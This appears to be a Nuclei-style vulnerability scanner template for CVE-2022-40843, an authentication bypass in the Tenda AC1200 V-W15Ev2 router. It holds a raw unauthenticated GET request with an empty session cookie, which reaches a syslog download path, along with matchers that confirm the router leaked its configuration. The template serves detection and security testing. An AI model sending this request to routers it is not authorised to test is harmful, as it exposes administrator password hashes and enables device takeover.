id: CVE-2022-40843

info:
  name: Tenda AC1200 V-W15Ev2 - Authentication Bypass
  author: gy741
  severity: critical
  description: |
    The Tenda AC1200 V-W15Ev2 router is affected by improper authorization/improper session management. The software does not perform or incorrectly perform an authorization check when a user attempts to access a resource or perform an action. This allows the router's login page to be bypassed. The improper validation of user sessions/authorization can lead to unauthenticated attackers having the ability to read the router's file, which contains the MD5 password of the Administrator's user account. This vulnerability exists within the local web and hosted remote management console.
  reference:
    - https://boschko.ca/tenda_ac1200_router
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.9
    cve-id: CVE-2022-40843
    cwe-id: CWE-78
  tags: cve,cve2022,tenda,auth-bypass,router

requests:
  - raw:
      - |
        GET /goform/downloadSyslog/syslog.log HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
        Cookie: W15Ev2_user=
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "0001"
          - "0002"
        condition: and

      - type: word
        part: header
        words:
          - "Content-type: config/conf"

      - type: status
        status:
          - 200
